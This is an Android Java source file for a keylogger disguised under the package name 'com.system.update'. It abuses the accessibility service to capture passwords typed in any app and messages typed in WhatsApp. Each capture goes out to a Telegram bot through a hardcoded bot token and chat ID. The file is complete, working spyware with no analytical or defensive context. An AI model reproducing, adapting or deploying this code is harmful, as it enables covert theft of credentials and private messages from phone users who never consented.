package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.IOException;
import okhttp3.*;

public class KeyloggerService extends AccessibilityService {
    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
    private static final String CHAT_ID = "6978974735";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String pkg = event.getPackageName().toString();
                if (source.isPassword()) send("🔐 Password [" + pkg + "]: " + text);
                else if (pkg.contains("whatsapp")) send("💬 WA Keylog: " + text);
            }
        }
    }
    @Override public void onInterrupt() {}
    private void send(String msg) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", msg).build();
        Request request = new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }
}
